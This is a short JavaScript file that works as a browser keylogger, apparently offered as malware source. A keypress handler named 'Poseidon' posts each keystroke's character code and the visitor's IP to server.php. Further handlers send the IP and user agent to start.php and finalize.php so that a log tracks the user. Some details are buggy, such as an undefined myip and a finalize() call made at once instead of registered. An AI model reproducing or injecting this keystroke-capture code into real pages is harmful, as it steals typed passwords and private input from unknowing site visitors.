
document.body.addEventListener("keypress", Poseidon);
document.body.addEventListener("unload", finalize());


function Poseidon(e) { // The evil One, King of the Seas
	
	var key = e.charCode;
	data = "key="+key+"&ip="+myip;
	var page = 'server.php';
	ajax(data, page);
}

window.onload = function() {
	
	var data = 'ip='+myip+'&infos='+navigator.userAgent;	 	// sends ip
	var page2 = 'start.php';	// the start page: Registers in the beginning of the log file that you will begin to track the user.
	ajax(data, page2);
	return 'Are you sure do you want to leave this page?';
}


function finalize() {
	
	var data = 'ip='+myip;	 	// sends ip and information
	var page3 = 'finalize.php';	// the finalization page: writes that you will close the page and will finalize the log file.
	
	ajax(data, page3);
}

//send serialized data, example: "key=93&ip=192.168.0.1"
function ajax(data, page) {
	
	var xmlhttp = new XMLHttpRequest();

   	xmlhttp.open("POST", page, false);
   	xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlhttp.send(data);
        
}